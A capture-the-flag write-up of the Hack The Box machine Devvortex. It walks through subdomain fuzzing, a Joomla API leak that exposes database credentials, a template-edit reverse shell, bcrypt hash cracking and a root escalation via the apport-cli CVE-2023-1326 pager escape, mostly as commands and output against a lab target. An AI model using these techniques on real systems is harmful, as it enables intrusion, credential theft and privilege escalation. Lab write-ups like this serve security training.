## Recon

```
└─# rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.242 -- -sV
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.242:22
Open 10.10.11.242:80
[~] Starting Script(s)

```
Only 2 port open, http://devvortex.htb/
## Fuzz
```
└─# ffuf -u "http://devvortex.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt

 :: Method           : GET
 :: URL              : http://devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 454ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 583ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 314ms]
index.html              [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 410ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 335ms]


```
Nothing interessting, so i will enumerate subdomains.
```
└─# gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/Seclists/subdomains-top5000.txt --append-domain -k
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]

```
`└─# echo "10.10.11.242   dev.devvortex.htb" | tee -a /etc/hosts`
## Now Fuzz on this one.
```
└─# ffuf -u "http://dev.devvortex.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 301,302

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 301,302
________________________________________________

administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 901ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 788ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1081ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 946ms]
```
Found Joomla admin here : http://dev.devvortex.htb/administrator/

`curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`
Yoo, it's vulnerable to this one:
https://vulncheck.com/blog/joomla-for-rce

```
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}                                                         
```
I searched the last CVE on google
found : `"user":"lewis"` `"password":"P4ntherg0t1n5r3c0n##"`
These users and password wasn't work on ssh but work on the joomla website I am connected as admin users
## Shell
https://github.com/p0dalirius/Joomla-webshell-plugin
Edit template here
Editing file "/templates/cassiopeia/error.php" in template "cassiopeia".
http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=L2Vycm9yLnBocA&isMedia=0

Then i will curl this error.php
`curl http://dev.devvortex.htb/templates/cassiopeia/error.php`
```
┌──(bloman㉿1337)-[~]
└─$ sudo rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.62] from (UNKNOWN) [10.10.11.242] 58708
SOCKET: Shell has connected! PID: 1537
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:~/dev.devvortex.htb$ export TERM=xterm
export TERM=xterm
www-data@devvortex:~/dev.devvortex.htb$ ls
ls
LICENSE.txt    cli		  includes   media	 tmp
README.txt     components	  index.php  modules	 web.config.txt
administrator  configuration.php  language   plugins
api	       htaccess.txt	  layouts    robots.txt
cache	       images		  libraries  templates
www-data@devvortex:~/dev.devvortex.htb$ 
```
found logan user
```
logan
www-data@devvortex:/home$ cd logan
cd logan
www-data@devvortex:/home/logan$ ls
ls
user.txt
```

## Vertical
```
www-data@devvortex:/home/logan$ netstat -tupln | grep LISTEN
netstat -tupln | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      897/nginx: worker p 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      897/nginx: worker p 
tcp6       0      0 :::22                   :::*                    LISTEN      -     
```
I will connect on mYSQL using the first creds
```
www-data@devvortex:/home/logan$ mysql -u lewis -h localhost -p
mysql -u lewis -h localhost -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10041
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> mysql> select * from sd4fg_users;

| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-25 20:13:35 | 0          |                                      
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |


```
Now i will try to crack logan hash
In  hashcat it's `3200 	bcrypt $2*$, Blowfish (Unix) `

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sat Nov 25 20:24:20 2023 (32 secs)
Time.Estimated...: Sat Nov 25 20:24:52 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       44 H/s (5.55ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1392/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: moises -> tagged
Hardware.Mon.#1..: Temp: 76c Util: 91%

Started: Sat Nov 25 20:24:07 2023
Stopped: Sat Nov 25 20:24:54 2023
                                     
```
Now connected on ssh using this one
`logan@devvortex:~$ cat user.txt 
905e1a2a8dd2cc1697566ef4d239ae93
`
## Lateral 
First
```
logan@devvortex:~$ uname -a
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
logan@devvortex:~$ 
logan@devvortex:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
```
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
The apport cli is vulnerable to `CVE-2023-1326`, i will search for exploit
Exploit here : https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb
https://bugs.launchpad.net/ubuntu/+source/apport/+bug/2016023
```

Proof of concept:

```
```
ls /var/crash/
$ sudo apport-cli -c /var/crash/xxx.crash
[...]
Please choose (S/E/V/K/I/C): v
!id
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
```
But first i will try to get a crash using
```
you can also just create an crash via 
sleep 13 &
killall -SIGSEGV sleep
```
```
logan@devvortex:/var/crash$ ls
_usr_bin_sleep.1000.crash
logan@devvortex:/var/crash$ sudo apport-cli -c _usr_bin_sleep.1000.crash
!id
uid=0(root) gid=0(root) groups=0(root)
!sh
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
# whoami
root
# # whoami
root
# ls /root
root.txt
# cat /root/root.txt
ad825223af6d109b98e75e3b3b6054dc
# # hostnamectl
   Static hostname: devvortex
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 8e7b2e7692df48faa4e42d6cfc791ed2
           Boot ID: 48846ae55e2f49aa96907fe048d25d27
    Virtualization: vmware
  Operating System: Ubuntu 20.04.6 LTS
            Kernel: Linux 5.4.0-167-generic
      Architecture: x86-64
# 

```


Pwned